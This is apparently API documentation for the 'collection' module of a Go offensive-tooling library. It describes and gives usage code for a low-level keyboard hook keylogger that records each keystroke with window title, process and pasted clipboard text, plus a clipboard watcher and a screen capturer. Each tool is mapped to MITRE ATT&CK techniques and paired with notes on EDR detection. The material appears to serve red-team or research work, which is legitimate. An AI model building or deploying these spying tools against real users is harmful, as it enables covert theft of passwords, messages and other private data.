# Collection APIs

[<- Back to README](../README.md)

The `collection/` module provides data collection techniques for Windows: keyboard input capture, clipboard monitoring, and screen capture.

## Packages

| Package | Technique | MITRE ATT&CK | Platform |
|---------|-----------|---------------|----------|
| `collection/keylog` | Low-level keyboard hook | T1056.001 -- Input Capture: Keylogging | Windows |
| `collection/clipboard` | Clipboard text reading and monitoring | T1115 -- Clipboard Data | Windows |
| `collection/screenshot` | Screen capture via GDI | T1113 -- Screen Capture | Windows |

---

## collection/keylog -- Keyboard Hook

Package `keylog` installs a low-level keyboard hook (`WH_KEYBOARD_LL`) via `SetWindowsHookExW` and delivers keystroke events through a Go channel. Each event includes the translated character, modifier state, foreground window title, process path, and optional clipboard content on paste detection.

**MITRE ATT&CK:** T1056.001 (Input Capture: Keylogging)
**Platform:** Windows
**Detection:** Medium -- `SetWindowsHookExW` with `WH_KEYBOARD_LL` is a known indicator.

### Types

#### `Event`

```go
type Event struct {
    KeyCode   int       // Virtual key code (VK_*)
    Character string    // Translated character, or label like [Enter], [Backspace]
    Ctrl      bool      // Ctrl modifier was held
    Shift     bool      // Shift modifier was held
    Alt       bool      // Alt modifier was held
    Clipboard string    // Clipboard text (populated only on Ctrl+V)
    Window    string    // Foreground window title
    Process   string    // Foreground process executable path
    Time      time.Time // Capture timestamp
}
```

The `Character` field contains:
- Translated Unicode characters for printable keys (respects keyboard layout and CapsLock)
- Bracketed labels for special keys: `[Enter]`, `[Backspace]`, `[Tab]`, `[Esc]`, `[Delete]`, `[Insert]`, `[Home]`, `[End]`, `[PageUp]`, `[PageDown]`, `[Left]`, `[Right]`, `[Up]`, `[Down]`, `[PrtSc]`, `[Pause]`, `[CapsLock]`, `[NumLock]`, `[ScrollLock]`, `[Win]`, `[F1]`-`[F12]`
- Ctrl shortcut labels: `[Ctrl+A]`, `[Ctrl+C]`, `[Ctrl+V]`, `[Ctrl+X]`, `[Ctrl+Z]`, `[Ctrl+Y]`, `[Ctrl+S]`, `[Ctrl+F]`

When `[Ctrl+V]` is detected, the `Clipboard` field is populated with the current clipboard text content.

### Errors

```go
var ErrAlreadyRunning = errors.New("keyboard hook already running")
```

Only one keyboard hook per process is supported because the Win32 `HOOKPROC` callback cannot carry closure state.

### Functions

#### `Start`

```go
func Start(ctx context.Context) (<-chan Event, error)
```

**Purpose:** Installs a low-level keyboard hook and returns a channel that receives keystroke events. The hook runs until the context is cancelled. The channel is closed when the hook is removed.

**Parameters:**
- `ctx` -- Context for hook lifetime. Cancel the context to remove the hook.

**Returns:** A buffered channel (capacity 128) of `Event` values. Returns `ErrAlreadyRunning` if a hook is already active.

**How it works:**
1. Stores hook state in a process-global `atomic.Pointer` (required because `HOOKPROC` cannot be a closure).
2. Spawns a goroutine locked to an OS thread (`runtime.LockOSThread`).
3. Installs the hook via `SetWindowsHookExW(WH_KEYBOARD_LL, callback, 0, 0)`.
4. Runs a standard Win32 message pump (`GetMessageW` loop) -- required for low-level hooks.
5. On context cancellation, posts `WM_QUIT` to the message loop thread via `PostThreadMessageW`.
6. Unhooks via `UnhookWindowsHookEx` and closes the channel.

**Character translation:** Uses `ToUnicodeEx` with the foreground window's keyboard layout (`GetKeyboardLayout`) and temporarily attaches to the foreground thread's input queue (`AttachThreadInput`) for accurate modifier state.

**Example:**

```go
import (
    "context"
    "fmt"
    "time"

    "github.com/oioio-space/maldev/collection/keylog"
)

func main() {
    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    defer cancel()

    ch, err := keylog.Start(ctx)
    if err != nil {
        log.Fatal(err)
    }

    for ev := range ch {
        fmt.Printf("[%s] %s (window: %s)\n", ev.Time.Format("15:04:05"), ev.Character, ev.Window)
        if ev.Clipboard != "" {
            fmt.Printf("  clipboard: %s\n", ev.Clipboard)
        }
    }
}
```

### Advantages
- Full Unicode support via `ToUnicodeEx` -- handles non-Latin keyboard layouts
- Captures foreground window title and process path per keystroke
- Automatic clipboard content capture on paste detection
- Clean shutdown via context cancellation

### Limitations
- Only one hook per process (Win32 HOOKPROC constraint)
- `SetWindowsHookExW(WH_KEYBOARD_LL)` is a well-known EDR detection target
- The message pump must run on its dedicated OS thread -- blocks one goroutine
- Does not capture keystrokes in elevated windows from a non-elevated process (UIPI)

---

## collection/clipboard -- Clipboard Monitoring

Package `clipboard` provides clipboard text reading and real-time monitoring via polling. Uses the Win32 clipboard APIs (`OpenClipboard`, `GetClipboardData`, `GetClipboardSequenceNumber`).

**MITRE ATT&CK:** T1115 (Clipboard Data)
**Platform:** Windows
**Detection:** Low -- clipboard access is normal application behavior.

### Errors

```go
var ErrOpen = errors.New("clipboard open failed")
```

### Functions

#### `ReadText`

```go
func ReadText() (string, error)
```

**Purpose:** Reads the current clipboard text content (`CF_UNICODETEXT`).

**Returns:** The clipboard text as a Go string. Returns an empty string (no error) if the clipboard is empty or does not contain text. Returns `ErrOpen` if the clipboard cannot be opened (another application has it locked).

**How it works:**
1. Opens the clipboard via `OpenClipboard(0)`.
2. Checks for `CF_UNICODETEXT` format availability.
3. Gets the clipboard data handle via `GetClipboardData`.
4. Locks the global memory handle (`GlobalLock`) to get a pointer to the null-terminated UTF-16 string.
5. Converts to a Go string via `windows.UTF16PtrToString`.
6. Unlocks and closes the clipboard.

---

#### `Watch`

```go
func Watch(ctx context.Context, pollInterval time.Duration) <-chan string
```

**Purpose:** Monitors the clipboard for text changes and sends new content to the returned channel. The channel is closed when the context is cancelled.

**Parameters:**
- `ctx` -- Context for monitoring lifetime.
- `pollInterval` -- How often to check for changes. Values below 100ms are clamped to 100ms.

**How it works:** Polls `GetClipboardSequenceNumber` on a ticker. When the sequence number changes, reads the clipboard text and sends it on the channel. Empty text and read errors are silently skipped.

**Example:**

```go
import (
    "context"
    "fmt"
    "time"

    "github.com/oioio-space/maldev/collection/clipboard"
)

func main() {
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    // Read current clipboard
    text, err := clipboard.ReadText()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println("Current:", text)

    // Watch for changes
    ch := clipboard.Watch(ctx, 500*time.Millisecond)
    for text := range ch {
        fmt.Println("New clipboard:", text)
    }
}
```

### Advantages
- Uses sequence number polling -- no window creation or message pump required
- Lightweight and composable with other goroutines
- `ReadText` is also used by `collection/keylog` for paste detection

### Limitations
- Polling-based -- changes between polls are collapsed into one event
- Only captures `CF_UNICODETEXT`; binary clipboard formats (images, files) are ignored
- `OpenClipboard` can fail if another application has the clipboard locked

---

## collection/screenshot -- Screen Capture

Package `screenshot` captures screen content via the Windows GDI API (`BitBlt` + `GetDIBits`). Returns PNG-encoded bytes. Supports full-screen capture, rectangular region capture, and multi-monitor enumeration.

**MITRE ATT&CK:** T1113 (Screen Capture)
**Platform:** Windows
**Detection:** Low -- GDI screen capture is normal application behavior (used by screen sharing, recording tools, etc.).

### Errors

```go
var (
    ErrCapture      = errors.New("screen capture failed")
    ErrInvalidRect  = errors.New("invalid capture rectangle")
    ErrDisplayIndex = errors.New("display index out of range")
)
```

### Functions

#### `Capture`

```go
func Capture() ([]byte, error)
```

**Purpose:** Takes a screenshot of the primary display and returns PNG-encoded bytes.

**How it works:** Queries `GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)` for the primary display dimensions, then delegates to `CaptureRect`.

---

#### `CaptureRect`

```go
func CaptureRect(x, y, width, height int) ([]byte, error)
```

**Purpose:** Takes a screenshot of a specific screen region.

**Parameters:**
- `x`, `y` -- Top-left corner of the capture rectangle (screen coordinates).
- `width`, `height` -- Dimensions of the capture rectangle in pixels.

**Returns:** PNG-encoded bytes or an error.

**How it works:**
1. Gets the screen DC via `GetDC(0)`.
2. Creates a compatible memory DC and bitmap.
3. Copies pixels from screen to memory DC via `BitBlt(SRCCOPY)`.
4. Extracts raw pixel data via `GetDIBits` with a top-down 32bpp BITMAPINFOHEADER.
5. Converts BGRA pixel order to NRGBA in-place (swaps B and R channels, sets alpha to 255).
6. Encodes as PNG via Go's `image/png`.

---

#### `CaptureDisplay`

```go
func CaptureDisplay(index int) ([]byte, error)
```

**Purpose:** Takes a screenshot of a specific display by index (0-based).

**Parameters:**
- `index` -- Display index. Use `DisplayCount()` to get the number of available displays.

**Returns:** PNG-encoded bytes or `ErrDisplayIndex` if the index is out of range.

---

#### `DisplayCount`

```go
func DisplayCount() int
```

**Purpose:** Returns the number of active displays. Queries the current monitor layout on every call to reflect hotplug changes.

---

#### `DisplayBounds`

```go
func DisplayBounds(index int) image.Rectangle
```

**Purpose:** Returns the pixel bounds of a display by index (0-based). Returns an empty rectangle if the index is out of range.

**Example:**

```go
import (
    "fmt"
    "log"
    "os"

    "github.com/oioio-space/maldev/collection/screenshot"
)

func main() {
    // Capture primary display
    png, err := screenshot.Capture()
    if err != nil {
        log.Fatal(err)
    }
    os.WriteFile("screen.png", png, 0o644)
    fmt.Printf("Captured %d bytes\n", len(png))

    // Multi-monitor: capture each display
    for i := 0; i < screenshot.DisplayCount(); i++ {
        bounds := screenshot.DisplayBounds(i)
        fmt.Printf("Display %d: %v\n", i, bounds)

        png, err := screenshot.CaptureDisplay(i)
        if err != nil {
            log.Printf("display %d: %v", i, err)
            continue
        }
        os.WriteFile(fmt.Sprintf("display_%d.png", i), png, 0o644)
    }

    // Capture a specific region
    region, err := screenshot.CaptureRect(100, 100, 800, 600)
    if err != nil {
        log.Fatal(err)
    }
    os.WriteFile("region.png", region, 0o644)
}
```

### Advantages
- Returns PNG bytes directly -- no temporary files or image handles to manage
- Multi-monitor support via `EnumDisplayMonitors` with hotplug awareness
- Efficient: reuses pixel buffer, converts BGRA to NRGBA in-place

### Limitations
- GDI capture does not capture hardware-accelerated overlays (DirectX, Vulkan surfaces)
- Cannot capture the secure desktop (UAC prompts, lock screen)
- PNG encoding adds CPU overhead; for high-frequency capture, consider raw pixel output
